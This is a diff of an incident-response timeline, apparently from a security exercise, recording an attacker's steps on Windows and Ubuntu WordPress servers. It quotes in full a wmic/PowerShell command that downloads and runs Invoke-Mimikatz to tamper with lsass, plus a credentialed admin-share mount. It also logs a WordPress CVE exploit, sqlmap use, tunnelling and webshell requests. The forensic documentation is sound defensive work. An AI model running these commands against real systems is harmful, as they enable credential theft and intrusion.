@@ -34,3 +34,22 @@ c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4
 * 2020/8/5 PM 10:26:25 invoke Mimikatz via ```wmic  process call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'\""``` to modify ```lsass.exe```
 
 * 2020/8/5 PM 10:27:32 ```"c:\windows\system32\cmd.exe" /c net use z: \\WIN-LN8SES7K1Q5\C$ /user:TEAMT5\Administrator mimikatz```
+
+# ubuntu wordpress web server
+* 03/Aug/2020:09:38:35, ```CVE-2019-9978``` and post shell, bt.exe, nt.exe by ```10.20.3.131```
+
+* 04/Aug/2020:08:49:26, start to ```sqlmap``` by ```10.20.2.227```
+
+* 04/Aug/2020:09:16:31, tunnel (npv) start
+
+* 04/Aug/2020:09:42:07, use tunnel scan internet
+
+* 04/Aug/2020:09:45:56, login wordpress with admin account by ```10.20.2.165```
+
+* 04/Aug/2020:10:23:15, use tunnel request http://192.168.1.3/Umbraco/aaaa.aspx I don't know what it mean
+
+* 04/Aug/2020:22:15:48, use tunnel request http://192.168.1.2/admine21_decode.php I don't know what it mean
+
+* 04/Aug/2020:23:04:21, use tunnel request http://192.168.1.3/umbraco/AspxSpy2014Final.aspx it's webshell
+
+* 04/Aug/2020:23:07:16, use tunnel request http://192.168.1.3/umbraco/bbbb.aspx it's webshell
